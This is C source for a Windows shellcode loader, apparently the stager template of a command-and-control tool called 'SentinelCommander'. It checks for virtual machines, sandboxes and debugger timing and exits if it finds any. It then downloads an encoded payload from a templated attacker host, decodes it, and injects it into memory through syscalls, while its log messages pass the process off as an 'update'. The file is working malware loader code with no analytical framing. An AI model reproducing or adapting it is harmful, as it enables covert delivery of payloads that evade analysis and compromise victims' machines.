// SentinelCommander main template (revised v2)
#include <windows.h>

#include "common.h"
#include "debug.h"
#include "structs.h"

#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <intrin.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

static void *my_realloc(void *ptr, SIZE_T newSize) {
  HANDLE heap = GetProcessHeap();
  if (!ptr)
    return HeapAlloc(heap, 0, newSize);
  return HeapReAlloc(heap, 0, ptr, newSize);
}

BOOL AsciiHexToBin(unsigned char **buffer, DWORD *bufSize) {
  unsigned char *txt = *buffer;
  DWORD txtLen = *bufSize;
  DWORD maxBin = txtLen / 4 + 1;
  unsigned char *bin = HeapAlloc(GetProcessHeap(), 0, maxBin);
  if (!bin)
    return FALSE;

  DWORD bi = 0;
  for (DWORD i = 0; i + 3 < txtLen; ++i) {

    if ((txt[i] == '0' || txt[i] == 'O') &&
        (txt[i + 1] == 'x' || txt[i + 1] == 'X') && hex_is_digit(txt[i + 2]) &&
        hex_is_digit(txt[i + 3])) {
      unsigned char hi = hex_value(txt[i + 2]);
      unsigned char lo = hex_value(txt[i + 3]);
      bin[bi++] = (hi << 4) | lo;
      i += 3;
    }
  }

  HeapFree(GetProcessHeap(), 0, txt);
  *buffer = bin;
  *bufSize = bi;
  return TRUE;
}

static BOOL checkbox(void) {
  HKEY hKey;
  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\ControlSet001\\Services\\VBoxGuest", 0, KEY_READ,
                    &hKey) == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return TRUE;
  }
  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\ControlSet001\\Services\\VMTools", 0, KEY_READ,
                    &hKey) == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return TRUE;
  }
  if (GetModuleHandleW(L"sbiedll.dll") != NULL ||
      GetModuleHandleW(L"snxhk.dll") != NULL) {
    return TRUE;
  }
  return FALSE;
}

static BOOL TheClockIsMyCock(void) {
  LARGE_INTEGER t0, t1, freq;
  QueryPerformanceFrequency(&freq);
  QueryPerformanceCounter(&t0);
  Sleep(100);
  QueryPerformanceCounter(&t1);

  double ms =
      (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / (double)freq.QuadPart;
  return (ms < 80.0 || ms > 120.0);
}

static BOOL TheFinalBonFonDon(void) {
  if (checkbox())
    return TRUE;
  if (TheClockIsMyCock())
    return TRUE;
  return FALSE;
}

#define my_free(p) HeapFree(GetProcessHeap(), 0, p)

float _fltused = 0;

// #define TARGET_PROCESS	L"Notepad.exe"

// #define ANTI_ANALYSIS

BOOL GetUpdate(LPCSTR url, unsigned char **buffer, DWORD *bufSize);

unsigned char *enc_shellcode = NULL;
DWORD enc_shellcode_len = 0;

int main() {

  if (TheFinalBonFonDon()) {
    ExitProcess(1);
  }

  DWORD dwProcessId = 0;
  HANDLE hProcess = NULL;

  if (!Thebadmaninitialize()) {
    return -1;
  }

#ifdef ANTI_ANALYSIS

  if (!AntiAnalysis(20000)) {
#ifdef DEBUG
    PRINTA("[!] Found A bad Environment ");
#endif // DEBUG
  }

#endif
  //--------------------------------------------------------------------------------------

  PRINTA("[*] Fetching update from %s",
         "http://{{STAGER_IP}}:{{STAGER_PORT}}/payload.bin");
  if (!GetUpdate("http://{{STAGER_IP}}:{{STAGER_PORT}}/payload.bin",
                 &enc_shellcode, &enc_shellcode_len)) {
#ifdef DEBUG
    PRINTA("[!] Failed to fetch update");
#endif
    return -1;
  }

  PRINTA("[*] Successfully fetched update (%u bytes)", enc_shellcode_len);

  PRINTA("[*] Raw fetched (enc) first 16 bytes:    ");
  for (int i = 0; i < 16; i++) {
    PRINTA("0x%02X ", enc_shellcode[i]);
  }
  PRINTA("");

  if (!AsciiHexToBin(&enc_shellcode, &enc_shellcode_len)) {
#ifdef DEBUG
    PRINTA("[!] Failed to parse ASCII hex");
#endif
    return -1;
  }

  PRINTA("[*] installing update, size = %u bytes", enc_shellcode_len);

  if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, enc_shellcode,
                                         enc_shellcode_len, TRUE)) {
#ifdef DEBUG
    // PRINTA("[!] Failed To install update ");
#endif
    my_free(enc_shellcode);
    return -1;
  }
  my_free(enc_shellcode);
  PRINTA("[*] update installation succeeded");

  return 0;
}

BOOL GetUpdate(LPCSTR url, unsigned char **buffer, DWORD *bufSize) {
  HINTERNET hInet = InternetOpenA("SentinelCommander",
                                  INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  PRINTA("[*] InternetOpenA -> %p", hInet);

  if (!hInet)
    return FALSE;

  HINTERNET hUrl =
      InternetOpenUrlA(hInet, url, NULL, 0,
                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION |
                           INTERNET_FLAG_TRANSFER_BINARY,
                       0);

  PRINTA("[*] InternetOpenUrlA(%s) -> %p", url, hUrl);
  if (!hUrl) {
    InternetCloseHandle(hInet);
    return FALSE;
  }

  DWORD bytesRead = 0, total = 0;
  unsigned char *buf = NULL;
  BYTE chunk[4096];

  while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) &&
         bytesRead) {
    unsigned char *tmp = (unsigned char *)my_realloc(buf, total + bytesRead);
    if (!tmp) {
      my_free(buf);
      InternetCloseHandle(hUrl);
      InternetCloseHandle(hInet);
      return FALSE;
    }
    buf = tmp;
    _memcpy(buf + total, chunk, bytesRead);
    total += bytesRead;
    PRINTA("[*] Downloaded chunk: %u bytes, total = %u", bytesRead, total);
  }

  InternetCloseHandle(hUrl);
  InternetCloseHandle(hInet);
  PRINTA("[*] Completed download, total = %u bytes", total);

  *buffer = buf;
  *bufSize = total;
  return (buf != NULL);
}
